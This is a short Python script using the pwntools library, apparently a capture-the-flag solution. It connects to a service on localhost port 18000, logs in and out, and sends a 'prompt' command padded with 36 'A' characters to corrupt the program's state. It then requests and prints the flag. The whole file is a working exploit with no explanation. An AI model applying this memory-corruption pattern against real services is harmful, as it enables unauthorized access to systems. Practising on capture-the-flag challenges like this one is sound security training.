#!/usr/bin/env python
from pwn import *

TIMEOUT = 1

t = remote('localhost', 18000)

t.sendline('login user')
t.sendline('logout')
t.sendline('prompt ' + ('A' * 36))
t.sendline('getflag')

output = t.clean(TIMEOUT)

print(output[output.find('Flag: '):])